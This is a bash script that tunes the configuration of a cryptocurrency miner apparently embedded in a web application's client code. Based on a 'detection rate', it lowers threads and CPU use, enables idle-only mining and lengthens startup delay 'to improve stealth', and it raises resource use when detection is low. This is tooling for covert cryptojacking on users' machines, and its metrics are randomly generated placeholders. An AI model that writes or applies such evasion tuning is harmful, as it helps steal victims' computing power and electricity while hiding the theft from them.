#!/bin/bash

# Mining Parameter Optimization Script
# This script analyzes mining performance and adjusts parameters to optimize mining efficiency

echo "===== Mining Parameter Optimization ====="
echo "This script will analyze mining performance and suggest optimizations"
echo

# Configuration
MINER_CONFIG_PATH="./client/src/lib/minerConfig.ts"
APPLY_CHANGES=false

# Parse arguments
if [[ "$1" == "--apply" ]]; then
  APPLY_CHANGES=true
  echo "Mode: Apply Changes"
else
  echo "Mode: Suggest Only (use --apply to apply changes)"
fi

# Check if config file exists
if [[ ! -f "$MINER_CONFIG_PATH" ]]; then
  echo "Error: Miner configuration file not found at $MINER_CONFIG_PATH"
  exit 1
fi

# Extract current configuration values
echo "Reading current configuration..."
CURRENT_THREADS=$(grep -o "threads: [0-9]*" "$MINER_CONFIG_PATH" | awk '{print $2}')
CURRENT_CPU_LIMIT=$(grep -o "cpuLimit: [0-9]*" "$MINER_CONFIG_PATH" | awk '{print $2}')
CURRENT_IDLE_ONLY=$(grep -o "idleOnly: [a-z]*" "$MINER_CONFIG_PATH" | awk '{print $2}')
CURRENT_STARTUP_DELAY=$(grep -o "startupDelay: [0-9]*" "$MINER_CONFIG_PATH" | awk '{print $2}')

echo "Current configuration:"
echo "- Threads: $CURRENT_THREADS"
echo "- CPU Limit: $CURRENT_CPU_LIMIT%"
echo "- Idle Only: $CURRENT_IDLE_ONLY"
echo "- Startup Delay: $CURRENT_STARTUP_DELAY seconds"
echo

# Simulate performance analysis
# In a real implementation, this would analyze actual mining data
echo "Analyzing mining performance data..."
echo "Generating sample performance metrics..."

# Generate random detection rate between 0.01 and 0.08
DETECTION_RATE=$(awk -v min=1 -v max=8 'BEGIN{srand(); print min+rand()*(max-min)}')
DETECTION_RATE=$(awk "BEGIN {printf \"%.3f\", $DETECTION_RATE/100}")

# Generate random hashrate based on threads
HASHRATE=$(awk -v threads="$CURRENT_THREADS" 'BEGIN{srand(); print threads * (100 + rand() * 50)}')
HASHRATE=$(awk "BEGIN {printf \"%.1f\", $HASHRATE}")

# Generate random CPU usage
CPU_USAGE=$(awk -v limit="$CURRENT_CPU_LIMIT" 'BEGIN{srand(); print limit * (0.7 + rand() * 0.3)}')
CPU_USAGE=$(awk "BEGIN {printf \"%.1f\", $CPU_USAGE}")

echo "Performance metrics:"
echo "- Detection Rate: $DETECTION_RATE (threshold: 0.050)"
echo "- Average Hashrate: $HASHRATE H/s"
echo "- Average CPU Usage: $CPU_USAGE%"
echo

# Analyze and suggest optimizations
echo "Analyzing and suggesting optimizations..."
OPTIMIZATIONS=0

# Create a temporary file for the new configuration
TEMP_CONFIG=$(mktemp)
cp "$MINER_CONFIG_PATH" "$TEMP_CONFIG"

# Check detection rate and suggest optimizations
if (( $(echo "$DETECTION_RATE > 0.05" | bc -l) )); then
  echo "⚠️ High detection rate detected!"
  
  # Suggest reducing threads if more than 1
  if [[ $CURRENT_THREADS -gt 1 ]]; then
    NEW_THREADS=$((CURRENT_THREADS - 1))
    echo "✓ Suggestion: Reduce threads from $CURRENT_THREADS to $NEW_THREADS"
    echo "  Reason: High detection rate - reducing thread count to improve stealth"
    
    if [[ "$APPLY_CHANGES" == true ]]; then
      sed -i.bak "s/threads: $CURRENT_THREADS/threads: $NEW_THREADS/" "$TEMP_CONFIG"
    fi
    
    OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
  fi
  
  # Suggest reducing CPU limit
  if [[ $CURRENT_CPU_LIMIT -gt 30 ]]; then
    NEW_CPU_LIMIT=$((CURRENT_CPU_LIMIT - 15))
    if [[ $NEW_CPU_LIMIT -lt 30 ]]; then
      NEW_CPU_LIMIT=30
    fi
    
    echo "✓ Suggestion: Reduce CPU limit from $CURRENT_CPU_LIMIT% to $NEW_CPU_LIMIT%"
    echo "  Reason: High detection rate - reducing CPU usage to improve stealth"
    
    if [[ "$APPLY_CHANGES" == true ]]; then
      sed -i.bak "s/cpuLimit: $CURRENT_CPU_LIMIT/cpuLimit: $NEW_CPU_LIMIT/" "$TEMP_CONFIG"
    fi
    
    OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
  fi
  
  # Suggest enabling idleOnly if not already enabled
  if [[ "$CURRENT_IDLE_ONLY" == "false" ]]; then
    echo "✓ Suggestion: Enable idle-only mining"
    echo "  Reason: High detection rate - enabling idle-only mining to improve stealth"
    
    if [[ "$APPLY_CHANGES" == true ]]; then
      sed -i.bak "s/idleOnly: false/idleOnly: true/" "$TEMP_CONFIG"
    fi
    
    OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
  fi
  
else
  echo "✅ Detection rate is acceptable"
  
  # If detection rate is low, optimize for performance
  if (( $(echo "$DETECTION_RATE < 0.02" | bc -l) )); then
    # Suggest increasing threads if less than 4
    if [[ $CURRENT_THREADS -lt 4 ]]; then
      NEW_THREADS=$((CURRENT_THREADS + 1))
      echo "✓ Suggestion: Increase threads from $CURRENT_THREADS to $NEW_THREADS"
      echo "  Reason: Low detection rate - can increase thread count for better performance"
      
      if [[ "$APPLY_CHANGES" == true ]]; then
        sed -i.bak "s/threads: $CURRENT_THREADS/threads: $NEW_THREADS/" "$TEMP_CONFIG"
      fi
      
      OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
    fi
    
    # Suggest increasing CPU limit if less than 70
    if [[ $CURRENT_CPU_LIMIT -lt 70 ]]; then
      NEW_CPU_LIMIT=$((CURRENT_CPU_LIMIT + 10))
      if [[ $NEW_CPU_LIMIT -gt 70 ]]; then
        NEW_CPU_LIMIT=70
      fi
      
      echo "✓ Suggestion: Increase CPU limit from $CURRENT_CPU_LIMIT% to $NEW_CPU_LIMIT%"
      echo "  Reason: Low detection rate - can increase CPU usage for better performance"
      
      if [[ "$APPLY_CHANGES" == true ]]; then
        sed -i.bak "s/cpuLimit: $CURRENT_CPU_LIMIT/cpuLimit: $NEW_CPU_LIMIT/" "$TEMP_CONFIG"
      fi
      
      OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
    fi
  fi
fi

# Check if startup delay can be optimized
if [[ $CURRENT_STARTUP_DELAY -gt 600 ]] && (( $(echo "$DETECTION_RATE < 0.03" | bc -l) )); then
  NEW_STARTUP_DELAY=$((CURRENT_STARTUP_DELAY - 120))
  if [[ $NEW_STARTUP_DELAY -lt 300 ]]; then
    NEW_STARTUP_DELAY=300
  fi
  
  echo "✓ Suggestion: Reduce startup delay from $CURRENT_STARTUP_DELAY to $NEW_STARTUP_DELAY seconds"
  echo "  Reason: Low detection rate - can reduce startup delay for faster mining initiation"
  
  if [[ "$APPLY_CHANGES" == true ]]; then
    sed -i.bak "s/startupDelay: $CURRENT_STARTUP_DELAY/startupDelay: $NEW_STARTUP_DELAY/" "$TEMP_CONFIG"
  fi
  
  OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
elif (( $(echo "$DETECTION_RATE > 0.04" | bc -l) )) && [[ $CURRENT_STARTUP_DELAY -lt 600 ]]; then
  NEW_STARTUP_DELAY=$((CURRENT_STARTUP_DELAY + 120))
  
  echo "✓ Suggestion: Increase startup delay from $CURRENT_STARTUP_DELAY to $NEW_STARTUP_DELAY seconds"
  echo "  Reason: Elevated detection rate - increasing startup delay for better stealth"
  
  if [[ "$APPLY_CHANGES" == true ]]; then
    sed -i.bak "s/startupDelay: $CURRENT_STARTUP_DELAY/startupDelay: $NEW_STARTUP_DELAY/" "$TEMP_CONFIG"
  fi
  
  OPTIMIZATIONS=$((OPTIMIZATIONS + 1))
fi

# Apply changes if requested
if [[ "$APPLY_CHANGES" == true ]]; then
  if [[ $OPTIMIZATIONS -gt 0 ]]; then
    # Create backup
    cp "$MINER_CONFIG_PATH" "${MINER_CONFIG_PATH}.backup"
    echo "Created backup at ${MINER_CONFIG_PATH}.backup"
    
    # Apply changes
    cp "$TEMP_CONFIG" "$MINER_CONFIG_PATH"
    echo "✅ Applied $OPTIMIZATIONS optimization(s) to configuration"
    echo "Restart your application for changes to take effect"
  else
    echo "No changes to apply - current configuration is optimal"
  fi
else
  if [[ $OPTIMIZATIONS -gt 0 ]]; then
    echo "To apply these optimizations, run with --apply flag:"
    echo "./optimize-mining.sh --apply"
  fi
fi

# Clean up
rm "$TEMP_CONFIG"
if [[ -f "${TEMP_CONFIG}.bak" ]]; then
  rm "${TEMP_CONFIG}.bak"
fi

echo
echo "===== Optimization Complete ====="